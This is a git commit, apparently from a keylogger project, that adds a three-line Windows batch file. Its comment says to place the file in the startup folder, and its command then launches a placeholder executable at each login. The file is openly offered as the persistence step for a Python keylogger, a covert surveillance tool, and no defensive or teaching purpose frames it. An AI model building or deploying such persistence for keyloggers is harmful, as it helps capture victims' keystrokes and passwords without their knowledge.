91cb33f8f4cb81b0acd50b0f3be0aaede844f0c2
M. Ahmed <20860945+sasoftwarerl@users.noreply.github.com>
2018-03-28 19:52:16 -0400

    Create keylog_startup.bat

---
+++ keylog_startup.bat
@@ -0,0 +1,3 @@
+REM Place in startup folder if you dont include bat creation function in python keylogger, replace input_path_log with path to executable 
+start "" input_path_log/myProgram.exe
+exit
